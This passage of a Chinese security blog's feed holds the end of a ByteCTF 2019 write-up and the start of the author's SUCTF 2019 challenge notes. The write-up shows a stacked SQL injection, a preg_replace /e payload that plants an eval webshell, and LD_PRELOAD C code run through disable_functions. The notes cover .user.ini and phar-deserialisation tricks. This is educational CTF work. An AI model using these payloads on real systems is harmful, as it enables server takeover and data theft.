class="hljs-string">"benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?\\(|\\b(and|or)\\b\\s*?([\\(\\)'\"\\d]+?=[\\(\\)'\"\\d]+?|[\\(\\)'\"a-zA-Z]+?=[\\(\\)'\"a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\"'])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|'|\").*?(`|'|\")\s*)|UPDATE\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|'|\").*?(`|'|\")\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)@{0,2}(\\(.+\\)|\\s+?.+?\\s+?|(`|'|\").*?(`|'|\")|(\+|-|~|!|@:=|"</span> . urldecode(<span class="hljs-string">'%0B'</span>) . <span class="hljs-string">").+?)FROM(\\(.+\\)|\\s+?.+?|(`|'|\").*?(`|'|\"))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line"><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/'</span> . $filter . <span class="hljs-string">'/is'</span>, $value)){</span><br><span class="line">  <span class="hljs-keyword">exit</span>(<span class="hljs-string">"&lt;script&gt;alert('Failure!Do not use sensitive words.');location.href='index.php';&lt;/script&gt;"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>看起来虽然过滤了很多，但是我们依然可以使用堆叠注入来绕过：</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">set</span> @t=<span class="hljs-number">0x73656c65637420312c323b</span>;<span class="hljs-keyword">prepare</span> x <span class="hljs-keyword">from</span> @t;<span class="hljs-keyword">execute</span> x;</span><br></pre></td></tr></tbody></table></figure><p></p><p>所以我们把上面的 sql 语句换成16进制，就行了</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">';<span class="hljs-keyword">set</span> @t=<span class="hljs-number">0x757064617465207573657273207365742069737669703d3120776865726520757365726e616d653d277a656464273b</span>;<span class="hljs-keyword">prepare</span> x <span class="hljs-keyword">from</span> @t;<span class="hljs-keyword">execute</span> x;</span><br></pre></td></tr></tbody></table></figure><p></p><p>成为 vip 之后看到 replace.php 当中的内容：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = addslashes(preg_replace(<span class="hljs-string">"/"</span> . $_POST[<span class="hljs-string">'find'</span>] . <span class="hljs-string">"/"</span>, $_POST[<span class="hljs-string">'replace'</span>], $row[<span class="hljs-string">'content'</span>]));</span><br></pre></td></tr></tbody></table></figure><p></p><p>比较明显的一个利用 php 正则<code>/e</code>执行命令的写法，可以使用<code>%00</code>截断最后的一个斜杠，在<code>$_POST['find']</code>中使用<code>/e</code>修饰符</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find=/e%<span class="hljs-number">00</span>&amp;replace=phpinfo();&amp;regex=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">2</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>POST 之后拿到 phpinfo 信息，Web 根目录 <code>/var/www/html</code>， disable_functions :</p><p></p><figure class="highlight perl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,ini_set,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,<span class="hljs-keyword">system</span>,<span class="hljs-keyword">exec</span>,shell_exec,popen,proc_open,passthru,<span class="hljs-keyword">symlink</span>,<span class="hljs-keyword">link</span>,syslog,imap_open,dl,mail</span><br></pre></td></tr></tbody></table></figure><p></p><p>还有<code>putenv</code>，考烂了的 LD_PRELOAD 绕过，直接写个 webshell :</p><p></p><figure class="highlight reasonml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find=/e%<span class="hljs-number">00</span>&amp;replace=file<span class="hljs-constructor">_put_contents('<span class="hljs-operator">/</span><span class="hljs-params">var</span><span class="hljs-operator">/</span><span class="hljs-params">www</span><span class="hljs-operator">/</span><span class="hljs-params">html</span><span class="hljs-operator">/</span><span class="hljs-params">webshell</span>.<span class="hljs-params">php</span>','&lt;?<span class="hljs-params">php</span> <span class="hljs-params">eval</span>($<span class="hljs-params">_POST</span>[<span class="hljs-params">a</span>])</span>;');&amp;regex=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">2</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>发现还有 basedir 的限制，可以用以下列目录</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> ($dh = opendir(<span class="hljs-string">"glob:///*"</span>)) {</span><br><span class="line">true<span class="hljs-keyword">while</span> (($file = readdir($dh)) !== <span class="hljs-keyword">false</span>) {</span><br><span class="line">truetrue<span class="hljs-keyword">echo</span> <span class="hljs-string">"$file\n"</span>;</span><br><span class="line">true}</span><br><span class="line">trueclosedir($dh);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>在根目录有<code>/readflag</code>，直接写一个 so 文件就行了</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>  _GNU_SOURCE</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">pwn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{</span><br><span class="line">truesystem(<span class="hljs-string">"/readflag &gt; /var/www/html/res 2&gt;&amp;1"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getpid</span><span class="hljs-params">()</span></span>{</span><br><span class="line">  unsetenv(<span class="hljs-string">"LD_PRELOAD"</span>);</span><br><span class="line">  pwn();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>在当前 web 目录拿到 flag。//因为是复现环境就无所谓了。</p><h2 id="dot-server-prove"><a href="#dot-server-prove" class="headerlink" title="dot_server_prove"></a>dot_server_prove</h2><p>这个题比赛的时候没怎么看，看了 <a href="https://xz.aliyun.com/t/6312" target="_blank" rel="noopener">bytesCTF dot_server_prove WriteUP</a>，简单总结一下涉及的知识点：</p><ul><li>逆向 bin 文件查看逻辑，根据 host 来访问不同的站点，就像 apache 的 virtualhost 一样，读取 log 来保存你的 ua</li><li>在 ua 处进行 xss ，读取页面有 ssrf </li><li>ssrf 打 dict://172.18.0.3:6379/info 得到 redis 版本号 4.x </li><li>通过 gopher 利用主从复制的进行 RCE</li></ul><h2 id="iCloudMusic"><a href="#iCloudMusic" class="headerlink" title="iCloudMusic"></a>iCloudMusic</h2><p>打算与 SUCTF 的 iCloudMusic 放一起写吧</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>题目都不算特别难，除了马师傅的 iCloudMusic 跟 dot_server_prove ，两个不是很摸得着头脑的题， Web1/2/3 都有点魔改凑题的嫌疑，这几题并没有特别亮眼的知识点，都属于考过的，后面两题还是比较有意思的，dot_server_prove 可能不是很 get 到点，毕竟也属于一个比较新颖的题目了，以及马师傅的 iCloudMusic ，毕竟也是专门研究了一个多月的 electron orz…还是有一点收获的，希望线下赛不会被打爆 orz…</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;周末自己打了一会 Byte CTF ，队里其他师傅都没啥时间，自己做题比较慢，就只做了几个题。&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/tags/CTF/"/>
    
      <category term="sql注入" scheme="https://blog.zeddyu.info/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SUCTF 2019 出题笔记 &amp; phar 反序列化的一些拓展</title>
    <link href="https://blog.zeddyu.info/2019/08/24/SUCTF-2019/"/>
    <id>https://blog.zeddyu.info/2019/08/24/SUCTF-2019/</id>
    <published>2019-08-24T20:41:16.000Z</published>
    <updated>2021-09-27T17:45:58.720Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>这次我给 SUCTF 出了三道 Web，分别是 CheckIn 、 pythonginx 、 Upload Labs 2，下面聊一下出题时候的一些思路以及随想，还有最近对于 phar 的一些深入挖掘。</p><blockquote class="colorquote success"><p>文章首发于先知社区：<a href="https://xz.aliyun.com/t/6057" target="_blank" rel="noopener">https://xz.aliyun.com/t/6057</a></p></blockquote><a id="more"></a><h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>关于 CheckIn 这道题，是我在看 php 文档时候翻到的一个关于 .user.ini 的<a href="https://www.php.net/manual/en/configuration.file.per-user.php" target="_blank" rel="noopener">说明</a>，然后参考了 <a href="[https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html](https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html)">user.ini文件构成的PHP后门</a>，因为是比较久远的东西了，而且我看很多什么上传教程，甚至我认为总结比较全面的<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener"> upload labs </a>都未曾提及到这个 trick ，而且回忆了一下以及粗略搜了一下，都没有发现有过 CTF 出过这个 trick ，但是又比较简单，我猜肯定还有些人并不知道这个 trick ，所以就放在了 web1 作为签到的题目。</p><p>出题的时候直接拿了国赛华东北赛区一个题目源码来改的，原本是想直接 ban 掉<code>htaccess</code>的，节省大家的时间，不要让大家的思路跑偏。结果打错了成了<code>htacess</code>…然后就有一群师傅跑偏了…又因为权限的问题还被搅屎了…给师傅们谢罪了哐哐哐</p><h2 id="pythonginx"><a href="#pythonginx" class="headerlink" title="pythonginx"></a>pythonginx</h2><p>pythonginx 没什么特别好说的…是我思维太局限了…导致变成了猜 flag 位置的题，这题我是我前几天在 black hat 上看到 <a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a> 一个比较好玩的东西，正好拿来出题分享给大家，出题思路在于用 ℆ 这个字符去读取 <code>/user</code>目录下的敏感文件。</p><h2 id="Upload-Labs-2"><a href="#Upload-Labs-2" class="headerlink" title="Upload Labs 2"></a>Upload Labs 2</h2><p>其实这题最后 admin.php 应该用的<code>__wakeup</code>…不应该用的<code>__destruct</code>…自己半夜出题不是很清醒…验题的师傅也没看出问题，搞得考察的最后一环就没了…</p><p>这题其实琢磨了挺久，但是由于没有想到有什么好的 pop 链，就出题出成了这个亚子…</p><h3 id="FINFO-FILE"><a href="#FINFO-FILE" class="headerlink" title="FINFO_FILE"></a>FINFO_FILE</h3><p>最近研究了一波 phar 的反序列化，看了比较多的文章，其中我觉得写的很棒，对 CTFer 特别有用的就是 @seaii 的文章 <a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">利用 phar 拓展 php 反序列化漏洞攻击面</a> &amp; @zsx 的文章 <a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a>，通过在这两篇文章的揭露，我们可以发掘到比较多的函数，当我在自己进行研究的时候，发现了</p><p><code>finfo_file</code>/<code>finfo_buffer</code>/<code>mime_content_type</code></p><p>均通过<code>_php_finfo_get_type</code>间接调用了关键函数<code>php_stream_open_wrapper_ex</code>，导致均可以使用<code>phar://</code>触发 phar 反序列化，所以这里我选择了<code>finfo_file</code>作为 phar 反序列化的触发函数。</p><p>三个函数在 <a href="https://github.com/php/php-src/blob/47b95bd83c8f2b492a32cdfa58247c197271d248/ext/fileinfo/fileinfo.c#L599" target="_blank" rel="noopener">fileinfo.c 599 行</a>中 通过 <code>_php_finfo_get_type</code> 定义，在 552 行中 <code>_php_finfo_get_types</code> 调用了 <a href="https://github.com/php/php-src/blob/47b95bd83c8f2b492a32cdfa58247c197271d248/ext/fileinfo/fileinfo.c#L552" target="_blank" rel="noopener">php_stream_open_wrapper_ex</a>，</p><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>触发函数有了，那么接下里就是触发条件了。既然是与文件有关的函数均能触发 phar 反序列化，那么伪协议呢？</p><p>通过 @zsx 师傅的挖掘，发现基本上大多数 PHP stream 都可以通过 phar:// 来触发，但是就是没有提及 php:// 伪协议。</p><p>So，让我们用最常见的 <code>php://filter/read=convert.base64-encode/resource=</code>试一下</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190820121822.png" alt=""></p><p>好的，那么再看看文件包含如何</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190820121956.png" alt=""></p><p>一点也不意外，我们可以通过 php://filter 来绕过一些开头限制进行 phar 反序列化</p><h3 id="XXE-2-phar"><a href="#XXE-2-phar" class="headerlink" title="XXE 2 phar"></a>XXE 2 phar</h3><p>还有以及神秘的 config.php 只有这么一句话：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="hljs-keyword">true</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>禁用了外部实体，虽然题目给出的反射类确实可以反射，而且也可以进行 XXE，也有过相关的 CTF题 <a href="https://www.anquanke.com/post/id/170299#h2-2" target="_blank" rel="noopener">Annoying class</a>，虽然控制了 /flag 读取权限，可是为什么还要禁用外部实体呢？难不成 XXE 也可以反序列化？</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190820150125.png" alt=""></p><p>Test.xml 中的内容就是上面 <code>$xml</code>的内容</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBG